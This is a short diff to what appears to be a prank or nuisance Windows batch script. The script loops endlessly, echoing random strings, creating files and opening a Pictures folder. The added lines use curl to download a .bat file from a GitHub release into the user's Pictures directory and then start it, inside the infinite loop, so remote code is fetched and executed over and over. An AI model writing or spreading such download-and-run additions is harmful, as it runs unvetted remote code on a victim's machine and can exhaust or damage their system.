@@ -7,4 +7,6 @@ echo fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%ra
 mkdir fr.txt
 echo fr >> %random%fr.txt
 start C:\Users\fadia\Pictures\fr
+curl -L "https://github.com/lolfrsame/random-shit/releases/download/fr/frrrrrr.bat" -o C:\Users\fadia\Pictures\frrrrrr.bat
+start C:\Users\fadia\Pictures\frrrrrr.bat
 goto top
